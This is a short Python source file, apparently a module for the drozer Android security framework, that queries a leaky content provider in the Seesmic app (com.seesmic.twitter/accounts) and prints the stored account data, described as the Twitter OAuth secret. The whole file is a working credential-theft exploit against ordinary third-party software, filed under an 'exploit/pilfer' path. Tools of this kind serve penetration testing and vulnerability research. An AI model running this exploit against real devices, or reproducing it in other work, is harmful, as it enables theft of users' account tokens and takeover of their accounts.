from drozer.modules import common, Module

class OAuthTokens(Module, common.TableFormatter, common.Provider):
    
    name = "Extracts the Twitter Secret from Seesmic"
    description = """Extracts the Twitter Secret from Seesmic (com.seesmic), exposed through a leaky content provider."""
    examples = ""
    author = "Henry Hoggard"
    date = "2012-12-17"
    license = "BSD (3 clause)"
    path = ["exploit", "pilfer", "thirdparty", "seesmic", "twitter"]
    permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]
    
    __provider = "content://com.seesmic.twitter/accounts"
    
    def execute(self, arguments):
        cursor = self.contentResolver().query(self.__provider)
        
        if cursor != None:
            self.print_table(self.getResultSet(cursor))
        else:
            self.stderr.write("Could not query the Seesmic content provider.\n\n")
            